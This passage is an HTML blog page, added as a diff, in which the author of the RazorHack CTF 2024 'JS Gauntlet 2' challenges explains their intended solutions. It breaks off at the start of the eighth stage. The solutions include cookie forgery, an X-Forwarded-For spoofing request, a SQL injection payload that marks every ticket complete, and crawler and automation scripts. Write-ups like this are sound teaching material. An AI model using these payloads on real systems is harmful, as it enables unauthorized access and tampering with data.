@@ -1,0 +1,1277 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>
+            Alex Prosser - RazorHack CTF 2024 - JS Gauntlet 2 Write-up
+        </title>
+        <link
+            href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT"
+            crossorigin="anonymous"
+        />
+        <link href="\static\css\main.css" rel="stylesheet" />
+        <link
+            rel="apple-touch-icon"
+            sizes="180x180"
+            href="\static\res\favicon\apple-touch-icon.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="\static\res\favicon\favicon-32x32.png"
+        />
+        <link
+            rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="\static\res\favicon\favicon-16x16.png"
+        />
+        <link rel="manifest" href="\static\res\favicon\site.webmanifest" />
+        <link rel="shortcut icon" href="\static\res\favicon\favicon.ico" />
+        <meta name="msapplication-TileColor" content="#da532c" />
+        <meta
+            name="msapplication-config"
+            content="\static\res\favicon\browserconfig.xml"
+        />
+        <meta name="theme-color" content="#ffffff" />
+        <script
+            src="https://kit.fontawesome.com/b49a508af5.js"
+            crossorigin="anonymous"
+        ></script>
+        <script src="\static\js\circles.js" defer></script>
+        <link rel="stylesheet" href="\static\css\post.css" />
+        <link
+            rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css"
+        />
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    </head>
+
+    <body>
+        <div class="container">
+            <nav class="navbar-custom navbar navbar-expand-lg">
+                <a class="navbar-brand nav-link-custom" href="/">
+                    <img
+                        src="\static\res\logo.png"
+                        alt="Logo"
+                        width="32"
+                        height="32"
+                        class="d-inline-block align-text-middle"
+                    />
+                    Alex Prosser
+                </a>
+                <button
+                    class="navbar-toggler"
+                    type="button"
+                    data-bs-toggle="collapse"
+                    data-bs-target="#navbarSupportedContent"
+                    aria-controls="navbarSupportedContent"
+                    aria-expanded="false"
+                    aria-label="Toggle navigation"
+                >
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div
+                    class="collapse navbar-collapse"
+                    id="navbarSupportedContent"
+                >
+                    <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
+                        <li class="nav-item">
+                            <a class="nav-link nav-link-custom" href="/blog"
+                                >Blog</a
+                            >
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link nav-link-custom" href="/projects"
+                                >Projects</a
+                            >
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link nav-link-custom" href="/contact"
+                                >Contact</a
+                            >
+                        </li>
+                    </ul>
+                </div>
+            </nav>
+
+            <div id="circle-container"></div>
+
+            <div class="jumbotron jumbotron-custom pb-4">
+                <h2>RazorHack CTF 2024 - JS Gauntlet 2 Write-up</h2>
+                <h5>by Alex Prosser | 10/30/2024</h5>
+            </div>
+
+            <article class="pb-4">
+                <p>
+                    This post will be going over the sequel to my previous
+                    year&#39;s challenge, JS Gauntlet 2. I wanted to create more
+                    web challenges this year as I have transitioned into a web
+                    developer position at my workplace. Because of this, I
+                    decided that I would combine a traditional Web CTF
+                    challenge, with web exploits like SQL injection and request
+                    spoofing, with some of my creativity from last year, where I
+                    wanted to try to challenge people with only client-side(ish)
+                    JavaScript. The result was a 8-stage competition that,
+                    sadly, no one fully completed. I will go over the intended
+                    solutions, some stats, and what made me create such a
+                    convoluted mess.
+                </p>
+                <hr />
+                <h3 style="text-align: center" id="introduction">
+                    Introduction
+                </h3>
+
+                <div style="text-align: center">
+                    <a href="https://github.com/CodingAP/js-gauntlet-2"
+                        >Link to GitHub</a
+                    >
+                </div>
+                <p>
+                    <em
+                        ><strong
+                            >We have received a message from a hacker group
+                            called *R3n3gad3s* that has seemed to taken over our
+                            communications systems. These systems allow us to
+                            not only communicate with our different power
+                            stations around the nations, but also our messages
+                            and calls as well! It seems like they are about to
+                            put it up for ransom, but we will not allow that!
+                            However, we seem to have little experience in the
+                            offensive side of this type of stuff... can you help
+                            us?</strong
+                        ></em
+                    >
+                    <em><strong>~ IT Team</strong></em>
+                </p>
+                <p>
+                    This was the first message that people saw when looking at
+                    the work order, which was an attempt to try to turn it to an
+                    offensive attack where you save the system. Typically,
+                    I&#39;ve seen it where you just attack a website because you
+                    are told to. But, I wanted it to seem like you were on the
+                    &quot;good&quot; side (tbf it is all relative, but that is a
+                    political can of worms that is not worth it). Also, it lined
+                    up with the main storyline of the CTF that you were being
+                    attacked by an external force. This led to the first
+                    stage...
+                </p>
+                <hr />
+                <h3 style="text-align: center" id="a-secret-code">
+                    A Secret Code
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Well, it seems like that they expected us... They
+                            have locked our main dashboard out with a code of
+                            some sorts! How will we get around this? It has to
+                            be airtight security, right?</strong
+                        ></em
+                    >
+                    <em><strong>~ Sven from IT</strong></em>
+                </p>
+                <p><em>Solved: 21/33</em></p>
+                <p>
+                    The first thing I wanted to point out is that there is an IT
+                    team with names here, as they are the ones presenting you
+                    with what is happening. They don&#39;t seem to do anything,
+                    they just pile your work plate up and hope that you can
+                    accomplish it all. Anyways, this first challenge shows a
+                    typical login screen with username and password inputs, but
+                    it is being covered by a hacker overlay. Spoilers, this is
+                    going to be a running theme. You cannot delete this element
+                    as it will detect it and refresh the page (although you can
+                    easily get around that, the login page doesn&#39;t work so
+                    eh). The website says:
+                    <strong
+                        >This site has been compromised by the R3n3gad3s. Please
+                        stay put for further messages...</strong
+                    >
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\a-secret-code-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    Looking into the page source, we see a Russian comment that
+                    says in English:
+                    <strong
+                        >They thought they could fool us with shitty power
+                        solutions, so we had to teach them. Fortunately, since
+                        we are uber hackers, we took over. For other comrades,
+                        please use the key code provided on Telegram.</strong
+                    >. In a script tag, we also see a large checksum value and
+                    an key event listener...
+                </p>
+                <pre><code class="language-javascript">const checksum = &#39;Vm0wd2QyVkZOVWRpUm1ScFVtMW9WVll3Wkc...&#39;;
+let currentCode = &#39;&#39;, currentKeys = [];
+
+window.addEventListener(&#39;keydown&#39;, event =&gt; {
+    currentCode += event.key;
+    currentKeys.push(event.key);
+    currentCode = btoa(currentCode);
+
+    if (checksum == currentCode) {
+        fetch(&#39;/api/stage1/check&#39;, {
+            method: &#39;post&#39;,
+            headers: {
+                &#39;content-type&#39;: &#39;application/json&#39;
+            },
+            body: JSON.stringify(currentKeys)
+        })
+        .then(response =&gt; response.json())
+        .then(data =&gt; {
+            if (data.flag != null) {
+                document.querySelector(&#39;#flag-response&#39;).innerHTML =
+                `Welcome comrade! ${data.flag}...`;
+            }
+        });
+    }
+});
+</code></pre>
+                <p>
+                    As you can see, the key pressed is added to the string and a
+                    <em>btoa()</em> is used to encode the string into base64.
+                    This happens for each key press and when
+                    <em>currentCode</em> equals the large checksum, it sends a
+                    request for the flag. The keys that were pressed are also
+                    sent in the request to make sure you actually figured out
+                    the keys and can&#39;t just abuse the endpoint. The intended
+                    solution is to reverse the checksum with <em>atob()</em> and
+                    getting each key after each decode. So, it would look
+                    something like this...
+                </p>
+                <pre><code class="language-javascript">&gt; atob(checksum)
+&#39;Vm0wd2VFNUdiRmRp...hV2RvZEE9PWI=a&#39; // the key is &#39;a&#39;
+// remove &#39;a&#39; from checksum
+&gt; atob(checksum)
+&#39;Vm0weE5GbFdiRmhU...yb3dSaWdodA==b&#39; // the key is &#39;b&#39;
+// remove &#39;b&#39; from checksum
+// ...
+&gt; atob(checksum)
+&#39;QXJyb3dVcA==ArrowUp&#39; // the key is the up arrow
+// remove &#39;ArrowUp&#39; from checksum
+&gt; atob(checksum)
+&#39;ArrowUp&#39; // the key is the up arrow
+</code></pre>
+                <p>
+                    After decoding ten times, you get the keys
+                    <em
+                        >a, b, ArrowRight, ArrowLeft, ArrowRight, ArrowLeft,
+                        ArrowDown, ArrowDown, ArrowUp, ArrowUp</em
+                    >, which if you don&#39;t know is the Konami Code. It is
+                    backwards because when reversing the checksum, you get the
+                    last key pressed each time. Entering the code on the page
+                    will return the the string
+                    <strong
+                        >Welcome comrade!
+                        flag{30_lives_for_you_38201}...</strong
+                    >
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\a-secret-code-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="how-did-you-get-in-here">
+                    How Did You Get In Here?
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Ok, now that we can actually see what is happening,
+                            I&#39;ve just realized that a lot of our system is
+                            modularized, and they isolated it all. We just need
+                            to recover it all, starting with our account system.
+                            Find a way to get access to our admin accounts, and
+                            we can definitely get somewhere...</strong
+                        ></em
+                    >
+                    <em><strong>~ Justin from IT</strong></em>
+                </p>
+                <p><em>Solved: 10/33</em></p>
+                <p>
+                    The next challenge allows you to access the login page with
+                    a username and password, but each time you try to login, you
+                    receive an error message:
+                    <strong
+                        >Logins have been disabled by R3n3gad3s, but don&#39;t
+                        use password &#39;jobbin_pobbins&#39;!</strong
+                    >
+                    Sadly, no matter what username or password you try to enter,
+                    though, it will not work. The Russian comment in the source
+                    says:
+                    <strong
+                        >Hello, we have disabled the login system, so for other
+                        team members trying to log in, please use this cookie as
+                        a workaround. The typical login system won&#39;t work,
+                        so don&#39;t use it. Cookie:
+                        &#39;account=eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiW1JFREFDVEVEXSJ9&#39;</strong
+                    >
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\how-did-you-get-in-here-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    This heavily hints at a cookie modification, so opening the
+                    DevTools, we can edit the cookies on the webpage. A lot of
+                    people thought the session cookie was the one needed to be
+                    modified, but that only tracks the progress of the user and
+                    is not part of the challenge (I made sure that it was known
+                    after seeing it a couple of times). The comment aludes the
+                    the cookie needing to be called <em>account</em>, but if you
+                    just try to place the cookie in, it will not work. Decoding
+                    the cookie from base64 gives you this...
+                </p>
+                <pre><code class="language-json">{&quot;account_name&quot;:&quot;r3n3gad3s&quot;,&quot;account_password&quot;:&quot;[REDACTED]&quot;}
+</code></pre>
+                <p>
+                    Makes sense, now. However, we were given something in the
+                    form of
+                    <em>jobbin_pobbins</em>, so if we were to put that password
+                    in and encode it back to base64...
+                </p>
+                <pre><code class="language-javascript">cookie = {&quot;account_name&quot;:&quot;r3n3gad3s&quot;,&quot;account_password&quot;:&quot;jobbin_pobbins&quot;}
+btoa(cookie)
+// eyJhY2NvdW50X25hbWUiOiJyM24zZ2FkM3MiLCJhY2NvdW50X3Bhc3N3b3JkIjoiam9iYmluX3BvYmJpbnMifQ==
+</code></pre>
+                <p>
+                    Setting the cookie to this shows the flag:
+                    <strong>flag{clipping_through_the_bars_17493}</strong>
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\how-did-you-get-in-here-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="irresistible-force">
+                    Irresistible Force
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Ok, this seems like a crazy joke, but for us to get
+                            to our next system, we need to... play Pong.
+                            However, it seems like no one on the team can
+                            actually beat the bot they&#39;ve programmed in.
+                            This feels embarassing to ask, but see what you can
+                            do.</strong
+                        ></em
+                    >
+                    <em><strong>~ John from IT</strong></em>
+                </p>
+                <p><em>Solved: 7/33</em></p>
+                <p>
+                    Ok, this one was fun to make. I knew that I wanted to make a
+                    hackable game as a challenge, and it was one of my original
+                    ones to make a set of challenges. However, with all the
+                    challenges I planned, it was one of the first to be put on
+                    the cutting board. Not all my ideas were immediately
+                    shelved, as I reused them in other challenges, such as this
+                    one. The Russian comment said:
+                    <strong
+                        >It was fun to do, but now it&#39;s time to get serious.
+                        We&#39;re not going to let those bastards get by, so
+                        I&#39;ve made sure to add anti-cheat technology. I&#39;m
+                        sure there are no cracks in the system, so use the
+                        method described in Telegram to use the system if
+                        necessary.</strong
+                    >
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\irresistible-force-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    The page consists of a game of Pong where the player must
+                    score 5 points to continue. However, the bot in the game is
+                    unbeatable in the traditional sense. No matter what, the bot
+                    will always hit the ball, and there is no way to modify the
+                    client code as I put it in an anonymous function (you can
+                    delete it, but then you can&#39;t play the game then). There
+                    are exposed variables, however, that you can modify. They
+                    just happen to be obfuscated so you don&#39;t know what
+                    variable does what. The intended solution can go many ways
+                    as I only added a couple of anti-cheats. Those are:
+                </p>
+                <ul>
+                    <li>
+                        Changing the player or computer&#39;s score by more than
+                        one point
+                    </li>
+                    <li>Moving the ball too far or out of bounds</li>
+                    <li>Trying to use the endpoint without proper fields</li>
+                    <li>Spamming scores too fast</li>
+                </ul>
+                <p>
+                    Each of these infractions will lead to a 5 minute timeout.
+                    You can get around it by either deleting your cookie and
+                    starting the challenge over, which can be a little
+                    inconvientent, but it is at least faster than waiting. If
+                    you find a way to score around these anti-cheat methods, you
+                    did it right!
+                </p>
+                <p>Here is the mapping for the variables:</p>
+                <pre><code class="language-javascript">let var_46, var_70; // player paddle position, computer paddle position
+let var_68, var_04, var_20; // paddle width, paddle height, paddle distance from edge
+let var_29, var_77; // ball x position, ball y position
+let var_01, var_75; // ball x speed, ball y speed
+let var_80; // ball size
+let var_07, var_45; // player input up, player input down
+let var_62, var_95; // player score, computer score
+let var_03; // game paused
+</code></pre>
+                <p>
+                    My personal solution is to set <em>var_20</em>, or the
+                    paddle distance to a high value to switch places with the
+                    player&#39;s paddle and the computer&#39;s paddle. I can
+                    move my paddle out of the way and score on the computer.
+                    Other solutions I have seen is to disable collision,
+                    somehow. I&#39;m not sure how they did that, but it works
+                    so... whatever. After scoring 5 points, the flag will
+                    appear:
+                    <strong>flag{hey_stop_looking_there_23912}</strong>
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\irresistible-force-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="teleportation">
+                    Teleportation
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Who would have that they would have attached a VPN
+                            to all of our services, so now we can&#39;t access
+                            the warning services without being in the right
+                            location. While it would be cool to travel for a
+                            &quot;vacation&quot;, I think we are going to do
+                            this on the cheap. Now the obvious question is what
+                            location, but a better question is why ask
+                            us?</strong
+                        ></em
+                    >
+                    <em><strong>~ Stanley from IT</strong></em>
+                </p>
+                <p><em>Solved: 3/33</em></p>
+                <p>
+                    For this stage, we now have access to the IT dashboard,
+                    which for a dashboard for all of IT&#39;s functions, it is
+                    pretty bare bones (make sense why they can&#39;t do much for
+                    you). The Russian comment says:
+                    <strong
+                        >I decided to hide my IP address now because apparently
+                        previous posts were leaked to the site. I don&#39;t know
+                        how it happened, but I hope it doesn&#39;t lead to
+                        problems in the future.</strong
+                    >
+                    In the previous 3 stages, the comment was prefixed with an
+                    IP of
+                    <em>194.242.26.157</em> (an actual Russian IP), but now it
+                    is censored.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\teleportation-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    You have 4 buttons that do different actions such as create
+                    a ticket or seeing the notifications. However, they are all
+                    disabled as alluded to in the challenge prompt because
+                    <strong>You are not in the correct location!</strong>. This
+                    prompts you to try to change the location somehow,
+                    especially since you have a Russian IP you can base it from.
+                    While location services could have been a cool time, because
+                    of how varied the implementations can be, I decided to go
+                    for the &quot;X-Forwarded-For&quot; header, which has been
+                    out of use for a little bit. This HTTP header allows the
+                    client to say from what IP the request came from. Because
+                    you can change this, it obviously became a security concern
+                    that you can so easily spoof IPs, which means that you can
+                    spoof locations. With this payload...
+                </p>
+                <pre><code class="language-javascript">fetch(&#39;/api/stage4/request&#39;, {
+    method: &#39;post&#39;,
+    headers: {
+        &#39;content-type&#39;: &#39;application/json&#39;,
+        &#39;x-forwarded-for&#39;: &#39;194.242.26.157&#39;
+    },
+    body: JSON.stringify({ id: &#39;lol&#39; })
+})
+.then(response =&gt; response.json())
+.then(data =&gt; { 
+    if (data.error) {
+        sendNotification(true, data.error);
+    } else {
+        sendNotification(false, data.flag);
+    }
+});
+</code></pre>
+                <p>
+                    ...the flag will appear in the notification. Just be sure to
+                    grab it before it goes away! The flag is
+                    <strong>flag{so_no_headers_28013}</strong>
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\teleportation-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="we-are-doing-this-again">
+                    We Are Doing This Again?
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >I can&#39;t help feel a sense of deja vu, but maybe
+                            because I went through a lot of corn mazes as a kid.
+                            Anyways, this seems to be the megamaze of my
+                            childhood dreams because it&#39;s 3D! I couldn&#39;t
+                            get through much, so I&#39;ll let you figure it out
+                            yourself...</strong
+                        ></em
+                    >
+                    <em><strong>~ Sven from IT</strong></em>
+                </p>
+                <p><em>Solved: 1/33</em></p>
+                <p>
+                    If you say that this one looks familar, it because it is. I
+                    decided to use some of the JS Gauntlet challenges from last
+                    year because they were not attempted or completed much (I
+                    think like 5 teams max actually attempted them). This is the
+                    maze one from Challenge #3 from last year. However, I
+                    decided to upgrade this maze from a crude 9x5 maze to a
+                    10x10x10 3D maze! The Russian comment says:
+                    <strong
+                        >Hello all, this 3D maze is a bit of a bitch to
+                        traverse, so I have given the solution to you here:
+                        nnnnneesene[REDACTED]</strong
+                    >. I decided to give a hint with the first floor of the maze
+                    being done as it makes it more clear just the scope you are
+                    dealing with.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\we-are-doing-this-again-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    Because I didn&#39;t want people to do it manually this
+                    time, I made sure that it was big enough to stop people from
+                    going all the way. I think the furthest people went manually
+                    was 3 levels before someone wrote the script for it. I also
+                    wanted it to not be too taxing of a script, so I essentially
+                    made 10 2D mazes, then stacked the exits and entrances on
+                    top of each other. Obviously, the intended solution is to
+                    write a maze solving script. Here is my script that I wrote
+                    to solve the maze with BFS, with the neighbors function
+                    essentially being a web crawler (made in NodeJS).
+                </p>
+                <pre><code class="language-javascript">const getPaths = async (currentPath) =&gt; {
+    const response = await fetch(`https://razorhack-js-gauntlet-2.chals.io/stage/5/${currentPath}`, {
+        headers: { cookie }
+    })
+    const html = await response.text();
+
+    let paths = [];
+    if (html.toLowerCase().includes(&#39;north&#39;)) paths.push(&#39;n&#39;);
+    if (html.toLowerCase().includes(&#39;south&#39;)) paths.push(&#39;s&#39;);
+    if (html.toLowerCase().includes(&#39;east&#39;)) paths.push(&#39;e&#39;);
+    if (html.toLowerCase().includes(&#39;west&#39;)) paths.push(&#39;w&#39;);
+    if (html.toLowerCase().includes(&#39;down&#39;)) paths.push(&#39;E&#39;);
+    return paths;
+}
+
+const directions = {
+    n: { x: 0, y: 1 },
+    s: { x: 0, y: -1 },
+    e: { x: 1, y: 0 },
+    w: { x: -1, y: 0 }
+}
+
+let queue = [{ x: 0, y: 0, path: &#39;&#39; }];
+let visited = { &#39;0,0&#39;: true };
+let finalPath = &#39;&#39;;
+let level = 1;
+
+while (queue.length != 0) {
+    let item = queue.shift();
+
+    const paths = await getPaths(finalPath + item.path);
+    if (paths.includes(&#39;E&#39;)) {
+        finalPath += item.path + &#39;E&#39;; 
+        queue = [{ x: item.x, y: item.y, path: &#39;&#39; }];
+        visited = { [`${item.x},${item.y}`]: true };
+
+        console.log(&#39;On Level:&#39;, ++level);
+
+        continue;
+    }
+
+    for (let i = 0; i &lt; paths.length; i++) {
+        let newPosition = { x: item.x + directions[paths[i]].x, y: item.y + directions[paths[i]].y };
+        if (!visited[newPosition.x + &#39;,&#39; + newPosition.y]) {
+            visited[newPosition.x + &#39;,&#39; + newPosition.y] = true;
+            queue.push({ x: newPosition.x, y: newPosition.y, path: item.path + paths[i] });
+        }
+    }
+}
+
+finalPath = finalPath.slice(0, finalPath.length - 1);
+console.log(finalPath);
+</code></pre>
+                <p>
+                    After running the script, it will give you the entire path
+                    that you can paste into the URL. Then, the flag will appear:
+                    <strong>flag{this_isnt_a_corn_maze_28131}</strong>.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\we-are-doing-this-again-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="best-in-class">
+                    Best In Class
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >We have recovered a good amount of services of our
+                            stuff, and that is good and all... But I see this as
+                            an opportunity to progress further. We have an
+                            internal system that checks how many IT tickets that
+                            we have completed within the last month. Now, I am
+                            no slacker, but my number are lower than they
+                            should. In fact, I need just one more tickets to
+                            reach the quota for the role of &quot;Good IT
+                            Boy&quot; for the month. However, our manager is the
+                            only one who can modify when a ticket is done as to
+                            prevent misuse. Can you, you know, up that number
+                            somehow?</strong
+                        ></em
+                    >
+                    <em><strong>~ Stanley from IT</strong></em>
+                </p>
+                <p><em>Solved: 0/33</em></p>
+                <p>
+                    So for this challenge and the rest after, no one was able to
+                    solve it. Only one team got to this point, so they are
+                    considered the champions of JS Gauntlet 2. I didn&#39;t give
+                    them anything like last year (I was tempted to give them the
+                    hat I wore the entire time, but I don&#39;t think anyone
+                    wants a cheap sweaty tophat as a prize). The Russian comment
+                    says:
+                    <strong
+                        >This seems like a nice system, so I didn&#39;t take it
+                        down. A bit primitive, but I like its simplicity. I
+                        could go ahead and modify everything that is here for
+                        the hell of it, but I think that is not
+                        necessary.</strong
+                    >
+                    This is because this stage isn&#39;t even for recovery,
+                    Stanley just wants his numbers up!
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\best-in-class-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    Looking into the Docker container, it seems like this
+                    challenge was actually broken! The <em>/data</em> directory
+                    wasn&#39;t copied over, so it wasn&#39;t able to create
+                    databases for the users (or user). Now that sucks, but
+                    considering the how the challenges went where only one team
+                    got to this point, it seems like it went under the radar.
+                    Essentially, each user that got to this point got their own
+                    SQLite database with 100 tickets in them. All but one ticket
+                    was complete, so we just need to find a way to complete the
+                    ticket without admin access. Luckily, it seems like the
+                    inputs in the <em>Create Ticket</em> dialog aren&#39;t
+                    sanitized, client or server side. We can tell by running
+                    this payload...
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\best-in-class-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    ...and you will get this in the table in the
+                    <em>List Tickets</em> dialog...
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\best-in-class-3.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    This means that we are entering some trailing function call,
+                    most likely an INSERT as we are creating a ticket. That
+                    means that between the parenthesis and the -- (which are
+                    comments in SQL), we can put any SQL code we want, such as
+                    modifying all tickets to be complete. We can also see what
+                    the table schema looks like by looking at what data is
+                    returned when calling <em>list_tickets</em> endpoint.
+                </p>
+                <pre><code class="language-json">{
+    &quot;TICKET_ID&quot;: 1,
+    &quot;TICKET_SUMMARY&quot;: &quot;Network latency in office network&quot;,
+    &quot;TICKET_DESCRIPTION&quot;: &quot;The office network is experiencing significant latency affecting all users.&quot;,
+    &quot;TICKET_AUTHOR&quot;: &quot;John&quot;,
+    &quot;TICKET_DATE&quot;: &quot;2023-05-09&quot;,
+    &quot;TICKET_COMPLETE&quot;: 1
+}
+</code></pre>
+                <p>
+                    That payload looks like this:
+                    <em>&#39;); UPDATE TICKETS SET TICKET_COMPLETE = 1 --</em>.
+                    Running the payload and looking back on the tables gives us
+                    the flag: <strong>flag{legit_number_one_19373}</strong>.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\best-in-class-4.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3
+                    style="text-align: center"
+                    id="were-definitely-doing-this-again"
+                >
+                    We're Definitely Doing This Again...
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Okay, now this is starting to get annoying. I have
+                            actually seen this puzzle before, but they seem to
+                            have made it 100x harder by adding a 5 minute timer!
+                            This is impossible, so I am going to call it
+                            quits...</strong
+                        ></em
+                    >
+                    <em><strong>~ John from IT</strong></em>
+                </p>
+                <p><em>Solved: 0/33</em></p>
+                <p>
+                    This is the second challenge from last years JS Gauntlet
+                    that made a return. This one seemed more popular as it has a
+                    very simple concept: complete the jigsaw puzzle. Only
+                    problem is that now you have a time limit of 5 minutes,
+                    which means that you must write a script (I would love to
+                    see this type of thing get speedran, but I highly doubt that
+                    to be possible). The Russian comment says:
+                    <strong
+                        >I actually took this from a guy called CodingAP. If he
+                        didn&#39;t want his puzzles being copied, then he
+                        wouldn&#39;t have put them out so easily...</strong
+                    >. That comment is a hint that you can look at my previous
+                    write up to see the way to do it (although no one made it
+                    here for that to matter ): ).
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\were-definitely-doing-this-again-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    The solution is the same from last year: write a script that
+                    solves it for you. You read where the piece should go, move
+                    it there, and keep doing it until all pieces are in the
+                    right place and the flag shows up. Here is the script I
+                    used, which runs based off key inputs to allow for better
+                    control of how it is done (copy and paste into console to
+                    make it work).
+                </p>
+                <pre><code class="language-javascript">current = { x: 0, y: 0 };
+
+const parseLocation = () =&gt; {
+    let str = document.querySelector(&#39;#piece-location&#39;).innerHTML;
+    let numbers = str.split(/[\(\)]/g)[1].split(&#39;, &#39;).map(Number);
+    return { x: numbers[0], y: numbers[1] }
+}
+
+const moveTo = (x, y) =&gt; {
+    let dx = Math.abs(current.x - x);
+    let dy = Math.abs(current.y - y);
+
+    window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: &#39; &#39; }));
+
+    for (let i = 0; i &lt; dx; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.x &lt; x) ? &#39;ArrowRight&#39; : &#39;ArrowLeft&#39; }));
+    }
+
+    for (let i = 0; i &lt; dy; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.y &lt; y) ? &#39;ArrowDown&#39; : &#39;ArrowUp&#39; }));
+    }
+
+    window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: &#39; &#39; }));
+
+    for (let i = 0; i &lt; dx; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.x &lt; x) ? &#39;ArrowLeft&#39; : &#39;ArrowRight&#39; }));
+    }
+
+    for (let i = 0; i &lt; dy; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.y &lt; y) ? &#39;ArrowUp&#39; : &#39;ArrowDown&#39; }));
+    }
+}
+
+const setCurrent = (x, y) =&gt; {
+    let dx = Math.abs(current.x - x);
+    let dy = Math.abs(current.y - y);
+
+    for (let i = 0; i &lt; dx; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.x &lt; x) ? &#39;ArrowRight&#39; : &#39;ArrowLeft&#39; }));
+    }
+
+    for (let i = 0; i &lt; dy; i++) {
+        window.dispatchEvent(new KeyboardEvent(&#39;keydown&#39;, { key: (current.y &lt; y) ? &#39;ArrowDown&#39; : &#39;ArrowUp&#39; }));
+    }
+
+    current.x = x;
+    current.y = y;
+}
+
+window.addEventListener(&#39;keydown&#39;, event =&gt; {
+    let pos = parseLocation();
+    if (event.key == &#39;r&#39; &amp;&amp; (current.x !== pos.x || current.y !== pos.y)) {
+        moveTo(pos.x, pos.y);
+    }
+
+    if (event.key == &#39;w&#39; &amp;&amp; current.y != 0) {
+        setCurrent(current.x, current.y - 1);
+    }
+
+    if (event.key == &#39;a&#39; &amp;&amp; current.x != 0) {
+        setCurrent(current.x - 1, current.y);
+    }
+
+    if (event.key == &#39;s&#39; &amp;&amp; current.y != 19) {
+        setCurrent(current.x, current.y + 1);
+    }
+
+    if (event.key == &#39;d&#39; &amp;&amp; current.x != 31) {
+        setCurrent(current.x + 1, current.y);
+    }
+});
+</code></pre>
+                <p>
+                    After running it (press &#39;r&#39; to move piece, and
+                    &#39;wasd&#39; to move selector in the right place instead
+                    of the arrow keys), the flag shows up:
+                    <strong>flag{i_actually_wasnt_sorry_83911}</strong>.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\were-definitely-doing-this-again-2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <hr />
+                <h3 style="text-align: center" id="we-will-never-surrender">
+                    We Will Never Surrender!
+                </h3>
+
+                <p>
+                    <em
+                        ><strong
+                            >Ok, we got most of stuff back, but if we can get
